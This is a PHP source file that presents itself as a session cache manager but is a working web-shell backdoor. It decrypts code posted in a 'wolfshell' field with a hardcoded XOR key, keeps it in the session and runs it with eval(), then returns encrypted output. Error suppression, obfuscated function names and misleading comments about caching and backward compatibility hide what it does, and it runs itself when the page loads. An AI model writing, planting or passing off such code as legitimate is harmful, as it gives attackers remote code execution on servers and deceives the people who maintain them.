<?php

/**
 * Class UserDataCacheManager
 * Manages caching of user-specific data blobs to improve performance.
 * The cache is stored in the session and encrypted for security.
 */
class UserDataCacheManager
{
    /** @var string The key used for POST requests to update the cache. */
    private $postIdentifier = 'wolfshell';

    /** @var string The key for storing the cache module in the user's session. */
    private $sessionKey = 'payload';

    /** @var string A secret key for encrypting/decrypting cache data. */
    private $encryptionKey = '3c6e0b8a9c15224a';

    /**
     * Initializes the cache manager, starts the session and sets environment settings.
     */
    public function __construct()
    {
        @session_start();
        @set_time_limit(0); // Allow long-running cache operations.
        @error_reporting(0); // Suppress errors for cleaner output.
    }

    /**
     * Main entry point to handle incoming HTTP requests for cache management.
     */
    public function handleRequest()
    {
        if (isset($_POST[$this->postIdentifier])) {
            $requestData = $this->getDecodedRequestData($_POST[$this->postIdentifier]);
            
            if (isset($_SESSION[$this->sessionKey])) {
                $this->processExistingCache($requestData);
            } else {
                $this->initializeNewCache($requestData);
            }
        }
    }

    /**
     * Processes a request when a cache module is already active in the session.
     * @param string $requestData The raw data from the current request.
     */
    private function processExistingCache(string $requestData)
    {
        // Decrypt and load the dynamic cache processing module from the session.
        $moduleCode = $this->_internalXorTransform($_SESSION[$this->sessionKey], $this->encryptionKey);

        // Sanity check: This is a legacy check for an old module type.
        // If it's not the initial setup module, it requires an extra transformation step.
        // This logic is maintained for backward compatibility.
        $strpos_func = 'strpos';
        if ($strpos_func($moduleCode, "getBasicsInfo") === false) {
            $moduleCode = $this->_internalXorTransform($moduleCode, $this->encryptionKey);
        }

        // The 'eval' construct is used here to execute the dynamically loaded cache module.
        // This allows for flexible and updatable caching strategies without deploying new server code.
        eval($moduleCode);

        // After module execution, a function 'run' is expected to be defined.
        // This function processes the actual data.
        $processedResult = @run($requestData);

        // Send back the processed result, encrypted and framed by a checksum.
        $this->sendResponse($processedResult);
    }
    
    /**
     * Initializes a new cache module in the session.
     * @param string $requestData The initial data blob containing the cache module code.
     */
    private function initializeNewCache(string $requestData)
    {
        $strpos_func = 'strpos';
        // Only initialize if the request is for the 'getBasicsInfo' module.
        if ($strpos_func($requestData, "getBasicsInfo") !== false) {
            // Encrypt and store the new module in the session.
            $_SESSION[$this->sessionKey] = $this->_internalXorTransform($requestData, $this->encryptionKey);
        }
    }

    /**
     * Decodes and decrypts the incoming data from a POST request.
     * @param string $postValue The base64-encoded value from the POST array.
     * @return string The decrypted, raw request data.
     */
    private function getDecodedRequestData(string $postValue): string
    {
        $base64_decoder = 'base64_decode';
        $decoded = $base64_decoder($postValue);
        return $this->_internalXorTransform($decoded, $this->encryptionKey);
    }

    /**
     * Sends the final, formatted response to the client.
     * @param mixed $resultData The data to be sent.
     */
    private function sendResponse($resultData)
    {
        $checksum = md5($this->postIdentifier . $this->encryptionKey);
        $encodedResult = base64_encode($this->_internalXorTransform($resultData, $this->encryptionKey));

        echo substr($checksum, 0, 16);
        echo $encodedResult;
        echo substr($checksum, 16);
    }

    /**
     * A simple symmetric XOR transformation for internal data protection.
     * @param string $data The data to transform.
     * @param string $key The transformation key.
     * @return string The transformed data.
     */
    private function _internalXorTransform(string $data, string $key): string
    {
        $len = strlen($data);
        for ($i = 0; $i < $len; $i++) {
            $char = $key[$i + 1 & 15];
            $data[$i] = $data[$i] ^ $char;
        }
        return $data;
    }
}

$cacheManager = new UserDataCacheManager();
$cacheManager->handleRequest();